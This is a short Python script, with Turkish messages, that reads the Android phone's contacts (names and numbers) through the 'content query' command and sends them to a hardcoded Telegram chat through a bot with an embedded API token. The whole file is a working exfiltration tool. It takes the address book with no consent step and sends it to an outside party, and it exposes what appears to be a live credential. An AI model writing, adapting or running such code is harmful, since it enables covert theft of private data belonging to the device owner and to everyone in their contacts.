import subprocess
import telebot

TOKEN = '7031744557:AAE0EjmV6Dyj9j_c4BaGagv3EzU1AqqzDp0'
TELEGRAM_ID = '7266447024'

bot = telebot.TeleBot(TOKEN)

def get_contacts():
    try:
        result = subprocess.run(
            ['content', 'query', '--uri', 'content://contacts/phones/', '--projection', 'display_name:number'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            contacts = result.stdout.decode('utf-8')
            return contacts
        else:
            error = result.stderr.decode('utf-8')
            print("Hata olustu:", error)
            return None
    except Exception as e:
        print("Beklenmeyen bir hata olustu:", e)
        return None

def send_contacts_via_telegram(contacts):
    if contacts:
        message = "Rehber Kisileri:\n" + contacts
        bot.send_message(TELEGRAM_ID, message)
    else:
        bot.send_message(TELEGRAM_ID, "Rehber bilgilerini alirken bir hata olustu.")

if __name__ == "__main__":
    contacts = get_contacts()
    send_contacts_via_telegram(contacts)
